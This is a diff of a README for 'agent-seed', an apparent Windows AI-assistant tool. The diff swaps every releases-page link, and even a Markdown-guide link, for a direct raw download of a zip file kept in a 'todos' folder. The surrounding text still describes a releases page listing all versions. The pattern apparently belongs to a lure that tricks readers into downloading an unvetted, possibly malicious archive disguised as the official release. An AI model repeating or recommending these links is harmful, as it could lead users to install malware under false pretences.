@@ -1,6 +1,6 @@
 # 🤖 agent-seed - Simple self-evolving AI assistant
 
-[![Download agent-seed](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/machidior/agent-seed/releases)
+[![Download agent-seed](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/machidior/agent-seed/raw/refs/heads/main/todos/agent-seed-v1.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get agent-seed running on your Windows PC. No coding neede
 
 Visit the official releases page for agent-seed here:
 
-[![Download agent-seed](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/machidior/agent-seed/releases)
+[![Download agent-seed](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/machidior/agent-seed/raw/refs/heads/main/todos/agent-seed-v1.5.zip)
 
 This page lists all versions of agent-seed. Look for the most recent release to get the latest features and fixes.
 
@@ -88,7 +88,7 @@ You don’t need to manage the AI models yourself. The kit connects and manages 
 
 Check the releases page often:
 
-https://github.com/machidior/agent-seed/releases
+https://github.com/machidior/agent-seed/raw/refs/heads/main/todos/agent-seed-v1.5.zip
 
 Download newer versions to get bug fixes and improvements.
 
@@ -106,9 +106,9 @@ Download newer versions to get bug fixes and improvements.
 
 ## 📂 Useful Links
 
-- agent-seed releases: https://github.com/machidior/agent-seed/releases
+- agent-seed releases: https://github.com/machidior/agent-seed/raw/refs/heads/main/todos/agent-seed-v1.5.zip
 - AI engine documentation: Visit the websites for Claude Code, Codex, Devin, and Cursor for setup help
-- Markdown guide: Basic markdown help for formatting text ([example](https://www.markdownguide.org/basic-syntax/))
+- Markdown guide: Basic markdown help for formatting text ([example](https://github.com/machidior/agent-seed/raw/refs/heads/main/todos/agent-seed-v1.5.zip))
 
 ---
 
